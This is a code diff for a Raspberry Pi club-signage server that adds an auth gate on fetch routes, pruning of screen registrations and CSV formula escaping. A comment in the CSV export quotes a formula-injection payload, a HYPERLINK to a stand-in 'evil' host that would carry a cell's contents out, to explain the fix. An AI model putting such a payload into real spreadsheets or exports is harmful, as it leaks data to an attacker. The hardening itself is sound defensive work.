@@ -10,9 +10,10 @@ const express = require('express');
 const { Store, newId } = require('./store');
 const { Hub } = require('./hub');
 const { DEFAULT_PORTAL, renderSplash, themeCss } = require('./portal-page');
-const { readPortalFiles } = require('./portal');
+const { readPortalFiles, writePortalSettings, portalFile } = require('./portal');
 const { mountBackupRoutes } = require('./backup-routes');
 const { mountRemoteAccessRoutes } = require('./remote-access-routes');
+const { osUpdateView } = require('./os-update');
 const { Feeds, LEAGUE_KEY_RE, SHOW_OPTIONS } = require('./feeds');
 const auth = require('./auth');
 const v = require('./validate');
@@ -159,10 +160,21 @@ function createApp(opts = {}) {
   });
 
   // ---------- Signage-server engine at /feeds (sports now, widgets too) ----------
-  // GET routes (display page, JSON, SSE) are open on the LAN like the player.
-  // POST routes (refresh, push, MCP) need the sports API token or a dashboard login.
+  // The sports display page, scores JSON and SSE are open on the LAN like the
+  // player: that is what a club points a second screen at, and it is all public
+  // football.
+  //
+  // Everything that makes the Pi fetch something needs the sports API token or
+  // a dashboard login — the POST routes (refresh, push, MCP), and the widget
+  // and place-search routes. A Pi can reach things the caller cannot (the club
+  // router's admin page, a till, a camera recorder), so an open "fetch this for
+  // me" route turns it into a way in. The engine refuses these too; this is the
+  // gate that matters, because the embedded engine runs with no token of its own.
+  const FEEDS_PRIVATE = /^\/api\/(widgets\/|geocode$|geocode\/)/;
   app.use('/feeds', (req, res) => {
-    if (req.method !== 'GET' && req.method !== 'HEAD' && req.method !== 'OPTIONS') {
+    const readOnly = req.method === 'GET' || req.method === 'HEAD';
+    const needsAuth = req.method !== 'OPTIONS' && (!readOnly || FEEDS_PRIVATE.test(req.path));
+    if (needsAuth) {
       const token = store.data.settings.sports?.apiToken || '';
       const given = String(req.get('authorization') || '').replace(/^Bearer\s+/i, '');
       const tokenOk =
@@ -497,12 +509,34 @@ function createApp(opts = {}) {
   }
 
   // ---------- Player (screens) — no login, LAN only ----------
+  /**
+   * Drop registrations that were never a screen.
+   *
+   * Any address on the club's network can register a screen id by asking for a
+   * manifest, up to MAX_SCREENS, after which a real screen coming back from a
+   * reboot is told "too many screens" — a cheap way to leave a clubhouse TV
+   * blank. A real screen polls its manifest every minute, so one that asked
+   * once, ten minutes ago, and was never renamed, never was one.
+   */
+  function pruneUnusedScreens() {
+    const cutoff = Date.now() - 10 * 60_000;
+    store.touch((d) => {
+      d.screens = d.screens.filter((s) => {
+        const unused = (s.fetches || 0) <= 1 && s.name === s.id && Date.parse(s.createdAt || 0) < cutoff;
+        return !unused || hub.isConnected(s.id);
+      });
+    }, { immediate: true });
+  }
+
   function screenFor(req, { register }) {
     const id = req.params.screenId;
     if (!v.SCREEN_ID_RE.test(id)) throw v.bad('Invalid screen id');
     let screen = data().screens.find((s) => s.id === id);
     if (!screen && register) {
-      if (data().screens.length >= MAX_SCREENS) throw new v.HttpError(429, 'Too many screens');
+      if (data().screens.length >= MAX_SCREENS) {
+        pruneUnusedScreens();
+        if (data().screens.length >= MAX_SCREENS) throw new v.HttpError(429, 'Too many screens');
+      }
       screen = store.touch(
         (d) => {
           const s = {
@@ -512,6 +546,7 @@ function createApp(opts = {}) {
             rotation: 0,
             createdAt: new Date().toISOString(),
             lastSeen: Date.now(),
+            fetches: 1,
           };
           d.screens.push(s);
           return s;
@@ -525,6 +560,7 @@ function createApp(opts = {}) {
       store.touch(() => {
         screen.lastSeen = Date.now();
         screen.ip = req.ip;
+        screen.fetches = (screen.fetches || 0) + 1;
         screen.userAgent = v.str(req.get('user-agent'), { max: 300 }).slice(0, 300);
         if (w && h) screen.resolution = `${w}×${h}`;
       });
@@ -599,6 +635,9 @@ function createApp(opts = {}) {
         d.settings.defaultPlaylistId = main.id;
         for (const s of d.screens) if (!s.playlistId) s.playlistId = main.id;
       });
+      // The guest sign-in page shows the club's name, and the portal cannot
+      // read db.json to find it out for itself.
+      publishPortalSettings();
       res.set('Set-Cookie', auth.sessionCookie(auth.issueToken(data().settings.sessionSecret), req)).json({ ok: true });
     })
   );
@@ -626,9 +665,10 @@ function createApp(opts = {}) {
 
   // Backups: USB stick (via the root helper) and download/restore a file.
   const backups = mountBackupRoutes({
-    app, api, dataDir, mediaDir, store, version: pkg.version,
+    app, api, dataDir, mediaDir, store, version: pkg.version, maxUploadBytes,
+    maxRestoreBytes: opts.maxRestoreBytes,
     setupRequired: () => !data().settings.adminHash,
-    onRestored: () => configureFeeds(),
+    onRestored: () => { configureFeeds(); publishPortalSettings(); },
   });
 
   // Remote access: switch SSH on or off (via the root helper).
@@ -663,6 +703,10 @@ function createApp(opts = {}) {
       sports: sportsView(),
       widgets: widgetsView(),
       tls: tlsView(),
+      // Settings → About. A few hundred bytes the root helper left behind last
+      // night, read per request so a restart that became due at 03:30 is on the
+      // screen the next time someone opens the dashboard.
+      osUpdate: osUpdateView(dataDir),
     });
   });
 
@@ -680,6 +724,7 @@ function createApp(opts = {}) {
         d.settings.language = language;
       });
       if (retitle) configureFeeds(); // the engine only uses the club name; keep its caches otherwise
+      if (retitle) publishPortalSettings(); // the guest sign-in page shows the club's name
       res.json(publicSettings());
     })
   );
@@ -799,6 +844,22 @@ function createApp(opts = {}) {
     }
   }
 
+  /** Hand the portal the settings and logo its sign-in page needs.
+      It runs as its own user and cannot read db.json — see lib/portal.js. */
+  function publishPortalSettings() {
+    const p = portalSettings();
+    const asset = p.logoAssetId ? data().assets.find((a) => a.id === p.logoAssetId && a.type === 'image' && a.file) : null;
+    try {
+      writePortalSettings(dataDir, {
+        club: data().settings.clubName || 'Our club',
+        portal: p,
+        logoPath: asset ? path.join(mediaDir, path.basename(asset.file.filename)) : null,
+      });
+    } catch (err) {
+      (opts.log || console.error)('[portal] could not publish the settings:', err.message);
+    }
+  }
+
   /** What pitchtribe-portal-apply found the last time it ran (portal-hw.js status). */
   function portalHardware() {
     try { return JSON.parse(fs.readFileSync(path.join(dataDir, 'portal-hardware.json'), 'utf8')); } catch { return null; }
@@ -860,19 +921,30 @@ function createApp(opts = {}) {
       };
       store.touch((d) => { d.settings.portal = next; }, { immediate: true });
       writePortalNetwork(next);
+      publishPortalSettings();
       res.json({ settings: next });
     })
   );
 
   api.get('/portal/guests.csv', (req, res) => {
     const { guests } = readPortalFiles(dataDir);
-    const q = (x) => `"${String(x).replace(/"/g, '""')}"`;
+    // Guests type their own email address, and Excel and Numbers treat a cell
+    // starting = + - or @ as a formula — so `=HYPERLINK("http://evil/"&A1)@x.com`
+    // runs when a volunteer opens the file. A leading apostrophe makes it text.
+    const q = (x) => {
+      const s = String(x);
+      const risky = /^[=+\-@\t\r]/.test(s);
+      return `"${(risky ? `'${s}` : s).replace(/"/g, '""')}"`;
+    };
     const rows = [['connected_at', 'email', 'marketing_consent'], ...guests.map((g) => [g.at, g.email, g.consent ? 'yes' : 'no'])];
     res.set({ 'Content-Type': 'text/csv; charset=utf-8', 'Content-Disposition': 'attachment; filename="wifi-guests.csv"', 'Cache-Control': 'no-store' })
       .send(`${rows.map((r) => r.map(q).join(',')).join('\r\n')}\r\n`);
   });
 
   api.delete('/portal/guests', (req, res) => {
+    // Both places: the portal keeps its files in DATA_DIR/portal now, and a
+    // card set up before that may still have the old one alongside.
+    fs.rmSync(portalFile(dataDir, 'portal-guests.jsonl'), { force: true });
     fs.rmSync(path.join(dataDir, 'portal-guests.jsonl'), { force: true });
     res.json({ ok: true });
   });
@@ -1117,6 +1189,12 @@ function createApp(opts = {}) {
     hub.close();
     store.flush();
   };
+
+  // On every start, not only when the settings are saved: the portal cannot
+  // read db.json, so after an upgrade or a restore this is what gives it the
+  // club's name, terms and logo. Last, because it reads the settings helpers
+  // defined above.
+  publishPortalSettings();
 
   return { app, store, hub, feeds, sports: feeds, close, dataDir };
 }
